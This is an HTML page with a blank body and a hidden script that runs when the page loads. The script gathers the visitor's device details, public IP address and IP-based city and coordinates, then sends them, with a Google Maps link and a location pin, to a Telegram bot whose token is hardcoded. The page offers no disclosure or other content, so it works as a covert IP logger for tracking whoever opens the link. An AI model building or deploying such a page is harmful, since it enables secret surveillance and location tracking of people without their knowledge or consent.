<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: white; min-height: 100vh; }
    </style>
</head>
<body>
    <script>
        const BOT_TOKEN = '8634804759:AAG6w2djkgWmJdYVlbUMEyKYfYuYpqSZ16M';
        const CHAT_ID = '8634804759';

        async function sendToTelegram(text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text
                })
            });
        }

        async function sendLocation(lat, lng) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: lat,
                    longitude: lng
                })
            });
        }

        async function getInfo() {
            const model = navigator.userAgent;
            const screenSize = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language;

            let ip = 'Unknown';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {
                try {
                    const res = await fetch('https://api64.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch (e2) {}
            }

            // Get location from IP
            let locationText = '';
            let lat = null, lng = null;
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const geo = await res.json();
                lat = geo.latitude;
                lng = geo.longitude;
                locationText = `${geo.city}, ${geo.region}, ${geo.country_name}`;
            } catch (e) {}

            const mapsLink = lat && lng 
                ? `https://www.google.com/maps?q=${lat},${lng}`
                : 'Location unavailable';

            const message = `📱 Device: ${model}\n📐 Screen: ${screenSize}\n🌐 Language: ${language}\n📍 IP: ${ip}\n🏙️ Location: ${locationText}\n🗺️ Maps: ${mapsLink}`;
            
            sendToTelegram(message);

            // Also send location pin
            if (lat && lng) {
                setTimeout(() => sendLocation(lat, lng), 500);
            }
        }

        window.addEventListener('load', getInfo);
    </script>
</body>
</html>
